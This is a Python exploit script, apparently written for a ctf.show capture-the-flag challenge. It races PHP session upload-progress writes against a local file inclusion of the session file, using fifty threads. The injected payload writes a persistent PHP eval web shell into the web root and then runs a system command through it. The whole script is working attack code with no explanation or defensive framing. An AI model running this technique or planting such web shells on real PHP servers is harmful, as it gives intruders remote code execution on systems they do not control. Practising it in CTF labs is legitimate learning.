import requests
import threading
import io

url = 'http://8ee56366-974b-4143-aa22-2eea0d4a3251.chall.ctf.show/'
r = requests.session()
headers = {
    "Cookie": 'PHPSESSID=dddd'
}


def POST():
    while True:
        files = {
            "upload": io.BytesIO(b'a' * 1024 * 50)
            # 上传无效的空文件
        }
        data = {
            "PHP_SESSION_UPLOAD_PROGRESS": "<?php file_put_contents('/var/www/html/2','<?php @eval($_POST[s]);?>');echo 'ruiwenya';?>"
        }
        r.post(url, files=files, headers=headers, data=data)
        # print('[+]POST')


def READ():
    data = {"s": "system('ls');"}
    while True:
        t = r.post(url + "?file=/tmp/sess_dddd", data=data)
        if 'ruiwenya' in t.text:
            # print('[+]retry')
            print(t.text)
            print(t.headers)
            print('success')
        else:
            print('sorry_error')
            pass


for i in range(50):
    threading.Thread(target=POST, args=()).start()
    threading.Thread(target=READ, args=()).start()


